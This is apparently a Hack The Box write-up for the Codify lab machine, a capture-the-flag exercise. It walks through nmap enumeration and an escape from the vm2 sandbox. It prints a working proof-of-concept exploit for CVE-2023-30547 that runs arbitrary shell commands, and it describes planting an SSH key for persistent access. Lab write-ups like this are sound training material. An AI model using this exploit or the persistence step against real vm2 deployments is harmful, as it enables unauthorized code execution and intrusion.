## Updating the Hosts Configuration with the Target:

To direct traffic towards the target, codify.htb, it is necessary to append its information to the __"/etc/hosts file"__. Ensure the target's details are accurately encoded in the hosts file and then save the changes to facilitate seamless interaction.

```bash

echo "10.10.14.239 codify.htb" | sudo tee -a /etc/hosts

```


## Enumeration: revealing the target's landscape.

Starting a Nmap scan is the critical first step in comprehending the complexities of the target environment. By painstakingly probing the target, the attacker acquires crucial knowledge, allowing for a more focused and educated investigation. This enumeration procedure establishes the groundwork for finding possible vulnerabilities, paving the way for the next stages of the penetration testing journey.

```bash
nmap -sC -sV -v -oN nmap.log 10.10.11.239
```

```bash

Port Analysis: Introducing Services on the Target System

- Port 22 shows an active OpenSSH 8.9p1 service, indicating that SSH is available for remote access. The use of a latest version indicates a lower chance of vulnerabilities.

- An Apache 2.4.52 web server is exposed on port 80. A thorough check with the http-methods probe reveals support for popular methods like GET, HEAD, and POST. This implies the presence of a web application, prompting additional investigation.

- Intriguingly, port 3000 reveals a live Node.js Express framework service. Given the typical susceptibility of Node.js apps to code and dependency vulnerabilities, this revelation offers up possibilities for further investigation and potential exploitation.


## Exploration of Codify's Environment -

Commencing the towards an initial foothold, I directed my attention to codify.htb, leveraging the capabilities of Burp Suite for traffic interception. A systematic exploration of the web application unveiled three primary pages:

-  About Us: This section provided a comprehensive overview, revealing Codify as a Node.js sandbox environment utilizing the vm2 library to securely execute untrusted code.

-  Editor: A straightforward page with a textarea interface enabled users to input Node.js code for execution.

-  Limitations: Highlighting operational constraints, this page documented restricted access to specific modules such as child_process and fs.

The "About Us" page disclosed that while Codify excelled in sandboxing code execution, it wasn't impervious to vulnerabilities.

Conducting an in-depth inquiry into the vm2 library, I uncovered a recently disclosed Sandbox Escape vulnerability, identified as   ___CVE-2023-30547___.  This newfound knowledge hinted at a potential avenue to exploit and surpass the sandbox limitations.

To validate this discovery, I implemented a Proof of Concept (PoC) exploit code within the textarea. This exploit manipulated Proxy and Error objects, enabling unauthorized access to the main process and execution of arbitrary commands, effectively demonstrating the practical exploitation of the identified vulnerability.


```bash

const {VM} = require("vm2");
const vm = new VM();

const code = `
cmd = 'id'
err = {};
const handler = {
    getPrototypeOf(target) {
        (function stack() {
            new Error().stack;
            stack();
        })();
    }
};
  
const proxiedErr = new Proxy(err, handler);
try {
    throw proxiedErr;
} catch ({constructor: c}) {
    c.constructor('return process')().mainModule.require('child_process').execSync(cmd);
}
`
console.log(vm.run(code));

```

Having successfully executed the exploit, I utilized this newfound capability to run commands on the underlying system. By adding my SSH public key to the ~/.ssh/authorized_keys file, I established a secure and persistent connection. Exploiting this access, I gained shell access as the current user, identified as "svc," marking a significant advancement in the penetration process. This achievement set the stage for continued exploration and manipulation within the system.

The vulnerable vm2 version along with sandbox escape primitives were key to gaining an initial foothold on the Codify server.

I SSH'd into the server as user svc:

```bash
ssh svc@codify.htb -i id_rsa
```
